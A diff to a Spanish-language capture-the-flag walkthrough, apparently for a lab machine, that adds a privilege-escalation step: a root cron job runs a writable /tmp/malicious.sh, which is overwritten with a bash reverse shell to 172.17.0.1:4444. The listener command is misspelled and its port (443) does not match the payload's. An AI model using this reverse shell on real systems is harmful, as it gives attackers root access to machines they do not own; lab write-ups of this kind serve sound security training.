@@ -84,4 +84,8 @@ Vemos que la contraseña para el usuario ```grooti``` es ```YoSoYgRoOt```, por l
 Viendo la programación de crontab con ```crontab -l 2>/dev/null``` vemos que se está ejecutando un script en ```/opt/cleanup.sh```, el cual tiene de contenido: 
 <img width="357" height="92" alt="image" src="https://github.com/user-attachments/assets/6a4760f1-5f34-4f02-b7f4-a95fa5ffc802" />
 
-vemos que este script ejecuta un archivo en ```/tmp/malicious.sh```, y nosotros tenemos acceso a editar ese archivo, por lo que podremos hacer una reverse shell con acceso a root escuchando en otra terminal en el cualquier puerto con ```nv -lvnp 443``` y copiando este script en la ```/tmp/malicious.sh```
+vemos que este script ejecuta un archivo en ```/tmp/malicious.sh```, y nosotros tenemos acceso a editar ese archivo, por lo que podremos hacer una reverse shell con acceso a root escuchando en otra terminal en el cualquier puerto con ```nv -lvnp 443``` y copiando este script en ```/tmp/malicious.sh```
+```
+echo '#!/bin/bash
+bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"' > /tmp/malicious.sh
+```
